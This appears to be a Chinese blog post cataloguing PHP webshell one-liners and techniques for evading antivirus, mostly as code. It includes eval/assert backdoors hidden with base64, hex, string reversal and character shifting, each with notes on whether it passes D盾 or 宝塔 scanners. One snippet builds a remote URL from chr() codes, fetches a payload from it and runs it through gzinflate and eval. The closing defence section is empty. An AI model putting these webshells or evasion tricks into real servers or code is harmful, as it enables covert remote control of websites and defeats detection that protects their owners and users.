+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $data=<span class="string">&quot;text&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;data); <span class="comment">// 太明显了, 也被查杀了(宝塔自带的查杀), 但是过了D 盾</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file_name=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">unserialize($file_name);</span><br></pre></td></tr></table></figure>
+
+<p>保存为phpinfo.php 然后传入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $data = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> foo();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>
+
+<p>id=<code>O:3:&quot;foo&quot;:1:&#123;s:4:&quot;data&quot;;s:10:&quot;phpinfo();&quot;;&#125;</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200227151802.png"></p>
+<blockquote>
+<p><strong>回调函数</strong></p>
+</blockquote>
+<p>最常见的回调函数的写法就是: <code>$ant=create_function(&quot;&quot;,&quot;eval($_POST[cmd]);&quot;);$ant();</code> 这种特征太明显的,肯定会被查杀</p>
+<p><strong><code>create_function</code> 的变形</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$function = create_function(<span class="string">&#x27;$code&#x27;</span>,strrev(<span class="string">&#x27;lave&#x27;</span>).<span class="string">&#x27;(&#x27;</span>.strrev(<span class="string">&#x27;TEG_$&#x27;</span>).<span class="string">&#x27;[&quot;code&quot;]);&#x27;</span>);$function(); <span class="comment">// ?code=</span></span><br><span class="line"><span class="comment">// 过不了D 盾,宝塔查杀</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$function = create_function(<span class="string">&#x27;$code&#x27;</span>,base64_decode(<span class="string">&#x27;ZXZhbCgkX0dFVFsidGVzdCJdKTs=&#x27;</span>));</span><br><span class="line">$function(); <span class="comment">// base64 的部分为: eval($_GET[&quot;test&quot;]); </span></span><br><span class="line"><span class="comment">// ?test=</span></span><br><span class="line"><span class="comment">// 过不了D 盾,宝塔查杀</span></span><br></pre></td></tr></table></figure>
+
+<p>这个的主要思路就是<strong>关键字替换</strong></p>
+<p><strong><code>preg_replace</code> 变形</strong></p>
+<p>通过<code>preg_replace</code>的<code>\e</code>模式下能够执行代码这种方式也是十分常见的，很多攻击者都喜欢使用<code>preg_replace</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@$a = $_POST[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($a)) &#123;</span><br><span class="line">    @preg_replace(<span class="string">&quot;/\[(.*)\]/e&quot;</span>, <span class="string">&#x27;\\1&#x27;</span>, base64_decode(<span class="string">&#x27;W0BldmFsKGJhc2U2NF9kZWNvZGUoJF9QT1NUW3owXSkpO10=&#x27;</span>));</span><br><span class="line">&#125; <span class="comment">//[@eval(base64_decode($_POST[z0]));]</span></span><br><span class="line"><span class="comment">// 貌似可以过D 盾,只是没有说没有后门</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>通过base64 将关键代码隐藏</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">funfunc</span>(<span class="params">$str</span>) </span>&#123;&#125;</span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">&quot;/&lt;title&gt;(.+?)&lt;\/title&gt;/ies&quot;</span>, <span class="string">&#x27;funfunc(&quot;\1&quot;)&#x27;</span>, $_POST[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line"><span class="comment">// 过不了D 盾, 过了宝塔查杀</span></span><br></pre></td></tr></table></figure>
+
+<p>利用了PHP 中可变变量执行代码的特点,<code>cmd=$&#123;@eval($_POST[xxx])&#125;&amp;xxx=phpinfo();</code>这种方式就可以执行任意的代码</p>
+<p>变形三:  </p>
+<p>preg_replace 类似的函数还有 <code>mb_ereg_replace</code> 和 <code>preg_filter</code> </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mb_ereg_replace(<span class="string">&#x27;.*&#x27;</span>, $_REQUEST[<span class="string">&#x27;pass&#x27;</span>], <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;e&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> preg_filter(<span class="string">&#x27;|.*|e&#x27;</span>, $_REQUEST[<span class="string">&#x27;pass&#x27;</span>], <span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>自定义函数</strong></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$string=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$password=<span class="string">&#x27;test&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[$password]))&#123;</span><br><span class="line">    $hex=$_POST[$password];</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($hex)<span class="number">-1</span>;$i+=<span class="number">2</span>)&#123;</span><br><span class="line">    $string.=chr(hexdec($hex[$i].$hex[$i+<span class="number">1</span>]));</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>($string)</span><br><span class="line">    <span class="comment">// 16进制代码执行</span></span><br></pre></td></tr></table></figure>
+
+<p>只需将传入的参数转换为16进制即可<code>shell.php?test=706870696e666f28293b</code> // phpinfo();</p>
+<blockquote>
+<p><strong>自定义加密</strong></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params">$string</span>) </span>&#123;</span><br><span class="line">    $result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>($index=<span class="number">0</span>;$index&lt;strlen($string);$index += <span class="number">1</span>) &#123;</span><br><span class="line">        $result .= chr(ord($string[$index])<span class="number">-3</span>); <span class="comment">// 将字母的ASCII-3</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line">$b = create_function(<span class="string">&#x27;&#x27;</span>,decode(<span class="string">&quot;Chydo+&#x27;bSRVW^fpg`,&gt;&quot;</span>));</span><br><span class="line">$b();</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">decode(&quot;Chydo+&#39;bSRVW^fpg&#96;,&gt;&quot;) 就是 @eval($_POST[cmd]);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>反射技术</strong></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$func = <span class="keyword">new</span> ReflectionFunction($_GET[m]);</span><br><span class="line"><span class="keyword">echo</span> $func-&gt;invokeArgs(<span class="keyword">array</span>($_GET[c]));</span><br></pre></td></tr></table></figure>
+
+<p>调用方法: <code>xx.com/shell.php?m=assert&amp;c=phpinfo();</code> </p>
+<p>和动态函数执行的方式十分相似,但是防护的差不多了</p>
+<blockquote>
+<p><strong>文件加密</strong></p>
+</blockquote>
+<p>主要就是代码混淆,现目前了解一下.即可</p>
+<h4 id="利用php-弱类型"><a href="#利用php-弱类型" class="headerlink" title="利用php 弱类型"></a>利用php 弱类型</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$__=(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>)+(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>);</span><br><span class="line">$_=$__/$__;</span><br><span class="line"></span><br><span class="line">$____=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$___=<span class="string">&quot;瞰&quot;</span>;$____.=~($___&#123;$_&#125;);$___=<span class="string">&quot;和&quot;</span>;$____.=~($___&#123;$__&#125;);$___=<span class="string">&quot;和&quot;</span>;$____.=~($___&#123;$__&#125;);$___=<span class="string">&quot;的&quot;</span>;$____.=~($___&#123;$_&#125;);$___=<span class="string">&quot;半&quot;</span>;$____.=~($___&#123;$_&#125;);$___=<span class="string">&quot;始&quot;</span>;$____.=~($___&#123;$__&#125;);</span><br><span class="line"></span><br><span class="line">$_____=<span class="string">&#x27;_&#x27;</span>;$___=<span class="string">&quot;俯&quot;</span>;$_____.=~($___&#123;$__&#125;);$___=<span class="string">&quot;瞰&quot;</span>;$_____.=~($___&#123;$__&#125;);$___=<span class="string">&quot;次&quot;</span>;$_____.=~($___&#123;$_&#125;);$___=<span class="string">&quot;站&quot;</span>;$_____.=~($___&#123;$_&#125;);</span><br><span class="line"></span><br><span class="line">$_=$$_____;</span><br><span class="line">$____($_[$__]);</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<hr>
+<p>一个比较厉害的webshell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password=<span class="string">&#x27;a&#x27;</span>;<span class="comment">//登录密码(支持菜刀)</span></span><br><span class="line"><span class="comment">//----------功能程序------------------//</span></span><br><span class="line">$c=<span class="string">&quot;chr&quot;</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_SESSION[<span class="string">&#x27;PhpCode&#x27;</span>]))&#123;</span><br><span class="line">$url=$c(<span class="number">104</span>).$c(<span class="number">116</span>).$c(<span class="number">116</span>).$c(<span class="number">112</span>).$c(<span class="number">58</span>).$c(<span class="number">47</span>);</span><br><span class="line">$url.=$c(<span class="number">47</span>).$c(<span class="number">105</span>).$c(<span class="number">46</span>).$c(<span class="number">110</span>).$c(<span class="number">105</span>).$c(<span class="number">117</span>);</span><br><span class="line">$url.=$c(<span class="number">112</span>).$c(<span class="number">105</span>).$c(<span class="number">99</span>).$c(<span class="number">46</span>).$c(<span class="number">99</span>).$c(<span class="number">111</span>);</span><br><span class="line">$url.=$c(<span class="number">109</span>).$c(<span class="number">47</span>).$c(<span class="number">105</span>).$c(<span class="number">109</span>).$c(<span class="number">97</span>).$c(<span class="number">103</span>);</span><br><span class="line">$url.=$c(<span class="number">101</span>).$c(<span class="number">115</span>).$c(<span class="number">47</span>).$c(<span class="number">50</span>).$c(<span class="number">48</span>).$c(<span class="number">49</span>).$c(<span class="number">55</span>);</span><br><span class="line">$url.=$c(<span class="number">47</span>).$c(<span class="number">48</span>).$c(<span class="number">53</span>).$c(<span class="number">47</span>).$c(<span class="number">50</span>).$c(<span class="number">49</span>).$c(<span class="number">47</span>);</span><br><span class="line">$url.=$c(<span class="number">118</span>).$c(<span class="number">49</span>).$c(<span class="number">81</span>).$c(<span class="number">82</span>).$c(<span class="number">49</span>).$c(<span class="number">77</span>).$c(<span class="number">46</span>).$c(<span class="number">103</span>).$c(<span class="number">105</span>).$c(<span class="number">102</span>);</span><br><span class="line">$get=chr(<span class="number">102</span>).chr(<span class="number">105</span>).chr(<span class="number">108</span>).chr(<span class="number">101</span>).chr(<span class="number">95</span>);</span><br><span class="line">$get.=chr(<span class="number">103</span>).chr(<span class="number">101</span>).chr(<span class="number">116</span>).chr(<span class="number">95</span>).chr(<span class="number">99</span>);</span><br><span class="line">$get.=chr(<span class="number">111</span>).chr(<span class="number">110</span>).chr(<span class="number">116</span>).chr(<span class="number">101</span>).chr(<span class="number">110</span>);</span><br><span class="line">$get.=chr(<span class="number">116</span>).chr(<span class="number">115</span>);</span><br><span class="line">$_SESSION[<span class="string">&#x27;PhpCode&#x27;</span>]=$get($url);&#125;</span><br><span class="line">$un=$c(<span class="number">103</span>).$c(<span class="number">122</span>).$c(<span class="number">105</span>).$c(<span class="number">110</span>);</span><br><span class="line">$un.=$c(<span class="number">102</span>).$c(<span class="number">108</span>).$c(<span class="number">97</span>).$c(<span class="number">116</span>).$c(base64_decode(<span class="string">&#x27;MTAx&#x27;</span>));</span><br><span class="line">@<span class="keyword">eval</span>($un($_SESSION[<span class="string">&#x27;PhpCode&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="制作一句话木马"><a href="#制作一句话木马" class="headerlink" title="制作一句话木马"></a>制作一句话木马</h3><p><code>assert()</code>函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> assert(@$_POST[<span class="string">&#x27;a&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当然这个过于简单,可以用上面的变形技术来进行变形,比如把assert进行base64,16进制混淆</p>
+<p><code>create_function()</code>函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$fun = create_function(<span class="string">&#x27;&#x27;</span>,$_POST[<span class="string">&#x27;a&#x27;</span>]); <span class="comment">// 把用户传递的数据作为一个函数</span></span><br><span class="line">$fun(); <span class="comment">// 执行这个函数</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>call_user_func()</code> 回调函数, 关于回调函数还有很多: </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array()</span><br><span class="line">call_user_func()</span><br><span class="line">array_filter() </span><br><span class="line">array_walk()  </span><br><span class="line">array_map()</span><br><span class="line">registregister_shutdown_function()</span><br><span class="line">register_tick_function()</span><br><span class="line">filter_var() </span><br><span class="line">filter_var_array() </span><br><span class="line">uasort() </span><br><span class="line">uksort() </span><br><span class="line">array_reduce()</span><br><span class="line">array_walk() </span><br><span class="line">array_walk_recursive()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @call_user_func(assert,$_POST[<span class="string">&#x27;a&#x27;</span>]); <span class="comment">// assert($_POST[&#x27;a&#x27;]);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200228194209.png"></p>
+<p>比较生僻的回调函数: </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">forward_static_call_array(assert,<span class="keyword">array</span>($_POST[x]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>file_put_contents()</code> 函数</p>
+<p>file_put_contents 函数<strong>将字符串写入文件</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $shell = <span class="string">&#x27;&lt;?php $a = $_POST[&#x27;</span>a<span class="string">&#x27;]; assert($a);?&gt;&#x27;</span>;</span><br><span class="line">    file_put_contents(<span class="string">&quot;config.php&quot;</span>,$shell); <span class="comment">// 将变量shell的内容写入到config.php文件中</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>定义函数</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">notashell</span>(<span class="params">$a</span>)</span>&#123;</span><br><span class="line">$a($_POST[x]);</span><br><span class="line">&#125;</span><br><span class="line">notashell(assert);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>定义类</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">shell</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $a;</span><br><span class="line">    <span class="keyword">var</span> $b;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$a,$b</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a=$a;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b=$b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        array_map(<span class="keyword">$this</span>-&gt;a,<span class="keyword">$this</span>-&gt;b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$p = <span class="keyword">new</span> shell(assert,<span class="keyword">array</span>($_POST[X]));</span><br><span class="line">$p-&gt;test();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h2 id="小马"><a href="#小马" class="headerlink" title="小马"></a>小马</h2><h2 id="大马"><a href="#大马" class="headerlink" title="大马"></a>大马</h2><h1 id="查杀技术"><a href="#查杀技术" class="headerlink" title="查杀技术"></a>查杀技术</h1><blockquote>
+<p>目前主流的木马查杀方法有：静态检查、动态检测、日志检查三种方式。<br> a、静态检查通过匹配特征码、危险函数和木马特征值来查杀木马程序，它的特点是快速方便，对已知的木马程序查找准确率较高，它的缺点是误报率较高，无法查找0Day型的木马程序，而且容易被绕过。<br> b、动态检测通过木马程序的动态特征来检测，当木马程序被上传到服务器上后，攻击者总会去执行它，当木马程序被执行时所表现出来的特征就是所谓的动态特征。<br> c、日志检测则主要通过日志分析检测技术来实现，它主要通过分析大量的日志文件并建立请求模型来检测出异常文件。它的优点为当网站上的访问量级达到一致值时，这种检测方法具有比较大参考性价值。它的缺点则是存在一定误报率，对于大量的日志文件，检测工具的处理能力和效率都会变的比较低。</p>
+</blockquote>
+<h1 id="免杀技术"><a href="#免杀技术" class="headerlink" title="免杀技术"></a>免杀技术</h1><h2 id="小马免杀"><a href="#小马免杀" class="headerlink" title="小马免杀"></a>小马免杀</h2><ul>
+<li>引用 &amp; , 需要结合 反引号 `</li>
+<li>可变变量 $$, 需要结合 反引号 `</li>
+<li>利用数组(一维数组,二维数组)</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*一维数组*/</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $a = substr_replace(<span class="string">&quot;assexx&quot;</span>,<span class="string">&quot;rt&quot;</span>,<span class="number">4</span>);</span><br><span class="line">	$b = <span class="keyword">array</span>(<span class="string">&#x27;&#x27;</span>=&gt;$($_POST[a]));</span><br><span class="line">	var_dump($b);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*二维数组*/</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">array</span>($array = <span class="keyword">array</span>(<span class="string">&#x27;&#x27;</span> =&gt; $b($_POST[a])));</span><br><span class="line">$b = substr_replace(<span class="string">&quot;assess&quot;</span>,<span class="string">&quot;rt&quot;</span>,<span class="number">4</span>);</span><br><span class="line">var_dump($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>数组交集</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;php</span><br><span class="line">$a1 = <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>=&gt;<span class="string">&quot;red&quot;</span>,<span class="string">&quot;ss&quot;</span>=&gt;<span class="string">&quot;green&quot;</span>,<span class="string">&quot;c&quot;</span>=&gt;<span class="string">&quot;blue&quot;</span>,<span class="string">&quot;er&quot;</span>=&gt;<span class="string">&quot;hello&quot;</span>,<span class="string">&quot;t&quot;</span>=&gt;<span class="string">&quot;hey&quot;</span>);</span><br><span class="line">$a2 = <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>=&gt;<span class="string">&quot;red&quot;</span>,<span class="string">&quot;ss&quot;</span>=&gt;<span class="string">&quot;blue&quot;</span>,<span class="string">&quot;d&quot;</span>=&gt;<span class="string">&quot;pink&quot;</span>,<span class="string">&quot;er&quot;</span>=&gt;<span class="string">&quot;hellos&quot;</span>,<span class="string">&quot;moza&quot;</span>=&gt;<span class="string">&quot;good&quot;</span>,<span class="string">&quot;t&quot;</span>=&gt;<span class="string">&quot;hey&quot;</span>);</span><br><span class="line">$result = array_intersect_key($result); <span class="comment">// 取数组交集</span></span><br><span class="line">$a = array_keys($result); <span class="comment">// 取数组键值</span></span><br><span class="line">$man = $a[<span class="number">0</span>].$a[<span class="number">1</span>].$a[<span class="number">2</span>].<span class="string">&quot;t&quot;</span>;</span><br><span class="line">$$k = $_POST[a];</span><br><span class="line">@$man(`<span class="comment">/**/</span>`.$kk=$kk);</span><br><span class="line">print_r($a1); <span class="comment">// 扰乱规则</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>回调函数</li>
+</ul>
+<p><code>array_map()</code> 回调函数会返回用户自定义函数作用后的数组</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200311135913.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">$a,$b</span>)</span>&#123;</span><br><span class="line">	array_map($a,$b);</span><br><span class="line">&#125;</span><br><span class="line">test(assert,<span class="keyword">array</span>($_POST[a]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里先定义一个函数用来接收回调函数名和回调函数的参数 最后就相当于执行了 assert($_POST[a])</p>
+<h2 id="大马免杀"><a href="#大马免杀" class="headerlink" title="大马免杀"></a>大马免杀</h2><ul>
+<li>思路: 加密&amp;混淆</li>
+</ul>
+<p>rot13, base64_encode, 利用注释进行混淆…</p>
+<ul>
+<li>create_function</li>
+<li>可变变量</li>
+</ul>
+<p>然后就是收集马儿, 但是有能力了还是自己写,因为有些大马可能会有后门.</p>
+<h1 id="webshell-检测与绕过"><a href="#webshell-检测与绕过" class="headerlink" title="webshell 检测与绕过"></a>webshell 检测与绕过</h1><p>参考 : Smi1e师傅的文章 <a target="_blank" rel="noopener" href="https://www.smi1e.top/php-webshell%e6%a3%80%e6%b5%8b%e4%b8%8e%e7%bb%95%e8%bf%87/">https://www.smi1e.top/php-webshell%e6%a3%80%e6%b5%8b%e4%b8%8e%e7%bb%95%e8%bf%87/</a></p>
+<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7151">免杀研究</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/155891.html">https://www.freebuf.com/articles/web/155891.html</a>  PS: 这篇文章的webshell 我很多试过都连不上,只能说算说拓展思路 -.- 注: 这篇文章的webshell 大部分都是2014 年的,很多都不能用了</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.operators.increment.php">https://www.php.net/manual/zh/language.operators.increment.php</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/36/">https://paper.seebug.org/36/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-qing-/p/10816874.html">https://www.cnblogs.com/-qing-/p/10816874.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.maixj.net/wz/webshell-12656">https://www.maixj.net/wz/webshell-12656</a></p>
+<p><a target="_blank" rel="noopener" href="http://fooor.cn/index.php/archives/63/">http://fooor.cn/index.php/archives/63/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.webshell.cc/2265.html">https://www.webshell.cc/2265.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://klionsec.github.io/2016/10/05/hidden-webshell/">https://klionsec.github.io/2016/10/05/hidden-webshell/</a></p>
+<p><strong>“Always be yourself, express yourself, have faith in yourself. Do not go out and look for a successful personality and duplicate it.”</strong></p>
+<p>“永远做自己，表达自己，对自己有信心。 不要出去寻找成功的个性并复制它。”</p>
